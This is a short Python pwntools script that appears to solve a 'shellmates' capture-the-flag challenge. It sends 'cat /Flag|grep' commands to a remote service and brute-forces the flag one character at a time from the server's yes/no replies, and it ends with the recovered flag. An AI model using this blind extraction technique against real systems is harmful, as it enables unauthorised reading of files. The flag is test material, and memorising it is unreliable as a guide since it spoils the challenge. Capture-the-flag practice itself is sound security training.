#!/usr/bin/python3

from pwn import *
import string 

host, port = "$server_IP",7001
flag = "shellmates{"
chars = string.ascii_letters + string.digits +"_}"

r = remote(host,port)

while "}" not in flag:
	for char in chars:
		r.sendline(f"cat /Flag|grep {flag}{char}")
		if b"GOOD" in r.recvline() :
			flag+=char
			print("The flag is : {}".format(flag))
			break

r.close()

#the flag is : shellmates{FiN3_I_WIlL_D0_I7_BLiNdLyy}
